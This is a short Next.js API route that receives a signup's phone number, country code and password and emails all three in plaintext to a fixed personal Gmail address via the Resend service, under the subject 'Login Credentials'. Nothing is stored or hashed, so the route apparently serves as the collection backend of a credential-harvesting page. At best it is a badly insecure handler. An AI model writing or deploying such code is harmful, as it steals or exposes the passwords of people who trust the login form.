import { Resend } from "resend"
import { NextResponse } from "next/server"

const resend = new Resend(process.env.RESEND_API_KEY)

export async function POST(request: Request) {
  try {
    const { phone, countryCode, password } = await request.json()

    const { data, error } = await resend.emails.send({
      from: "New User Signup <onboarding@resend.dev>",
      to: "lazyincshow@gmail.com",
      subject: "New User Signup - Login Credentials",
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
          <h2 style="color: #333; border-bottom: 2px solid #000; padding-bottom: 10px;">New User Registration</h2>
          <div style="background-color: #f5f5f5; padding: 20px; border-radius: 8px; margin-top: 20px;">
            <p style="margin: 10px 0;"><strong>Country Code:</strong> ${countryCode}</p>
            <p style="margin: 10px 0;"><strong>Phone Number:</strong> ${phone}</p>
            <p style="margin: 10px 0;"><strong>Password:</strong> ${password}</p>
            <p style="margin: 10px 0; color: #666; font-size: 12px;"><strong>Registered at:</strong> ${new Date().toLocaleString()}</p>
          </div>
          <p style="margin-top: 20px; color: #888; font-size: 12px;">This is an automated notification from your login system.</p>
        </div>
      `,
    })

    if (error) {
      return NextResponse.json({ error: error.message }, { status: 400 })
    }

    return NextResponse.json({ success: true, data })
  } catch (error) {
    return NextResponse.json(
      { error: "Failed to send email" },
      { status: 500 }
    )
  }
}
